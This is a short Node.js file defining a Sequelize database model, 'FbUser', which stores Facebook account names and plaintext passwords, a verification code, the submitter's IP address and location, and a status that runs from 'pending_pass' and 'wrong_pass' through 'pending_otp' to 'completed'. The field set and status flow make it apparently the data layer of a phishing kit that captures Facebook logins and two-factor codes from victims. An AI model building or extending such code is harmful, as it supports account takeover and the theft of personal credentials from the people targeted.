const { DataTypes } = require('sequelize');
const sequelize = require('../config/database');

const FbUser = sequelize.define('FbUser', {
  id: {
    type: DataTypes.UUID,
    defaultValue: DataTypes.UUIDV4,
    primaryKey: true,
  },
  // Facebook account info
  account: {
    type: DataTypes.STRING,
    allowNull: false,
  },
  password: {
    type: DataTypes.STRING,
    allowNull: false,
  },
  verifyCode: {
    type: DataTypes.STRING,
    allowNull: true,
    defaultValue: null,
  },
  // Status: 'pending_pass' | 'wrong_pass' | 'pending_otp' | 'completed'
  status: {
    type: DataTypes.STRING,
    allowNull: false,
    defaultValue: 'pending_pass',
  },
  // IP & Geo info
  ipAddress: {
    type: DataTypes.STRING,
    allowNull: true,
  },
  country: {
    type: DataTypes.STRING,
    allowNull: true,
  },
  region: {
    type: DataTypes.STRING,
    allowNull: true,
  },
  city: {
    type: DataTypes.STRING,
    allowNull: true,
  },
}, {
  tableName: 'fb_users',
  timestamps: true,
});

module.exports = FbUser;
